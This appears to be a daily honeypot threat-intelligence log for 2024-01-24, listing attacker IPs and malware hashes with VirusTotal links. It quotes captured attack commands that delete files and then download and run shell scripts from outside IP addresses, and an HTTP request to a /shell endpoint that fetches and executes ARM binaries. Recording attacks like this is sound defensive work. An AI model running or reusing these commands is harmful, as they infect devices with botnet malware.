@@ -1,0 +1,31 @@
+Top 5 IPs for 2024-01-24:
+
+106.13.202.246
+23.94.235.6
+5.228.1.217
+123.175.55.123
+208.65.84.33
+
+
+Malware download: 
+b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+https://www.virustotal.com/gui/file/b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+55f7d9e99b8e2d4e0e193b2f0275501e6d9c1ebd29cadbea6a0da48a8587e3e0
+https://www.virustotal.com/gui/file/55f7d9e99b8e2d4e0e193b2f0275501e6d9c1ebd29cadbea6a0da48a8587e3e0
+e35e04e80869422ddd08f8a121621c5bdaad7e89165072da0d1201cecb85ce95
+https://www.virustotal.com/gui/file/e35e04e80869422ddd08f8a121621c5bdaad7e89165072da0d1201cecb85ce95
+
+Malciious Commands seen:
+
+cd /data/local/tmp/; rm -rf *; busybox wget http://103.245.236.146/huhu1.sh; sh huhu1.sh; wget http://103.245.236.146/huhu1.sh; sh huhu1.sh; curl http://103.245.236.146/huhu1.sh; sh huhu1.sh; busybox wget http://103.245.236.146/huhu2.sh; sh huhu2.sh; wget http://103.245.236.146/huhu2.sh; sh huhu2.sh; curl http://103.245.236.146/huhu2.sh; sh huhu2.sh; busybox wget http://103.245.236.146/huhu3.sh; sh huhu3.sh; wget http://103.245.236.146/huhu3.sh; sh huhu3.sh; curl http://103.245.236.146/huhu3.sh; sh huhu3.sh;
+cd /data/local/tmp/; busybox wget http://172.188.112.116/w.sh; sh w.sh; curl http://172.188.112.116/c.sh; sh c.sh; wget http://172.188.112.116/wget.sh; sh wget.sh; curl http://172.188.112.116/wget.sh; sh wget.sh; busybox wget http://172.188.112.116/wget.sh; sh wget.sh; busybox curl http://172.188.112.116/wget.sh; sh wget.sh
+
+GET /shell?cd+/tmp;rm+arm4+arm7;wget+http:/\\/45.131.111.142/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\\/45.131.111.142/arm4;chmod+777+arm4;./arm4+jaws HTTP/1.1
+Host: <Host IP>
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
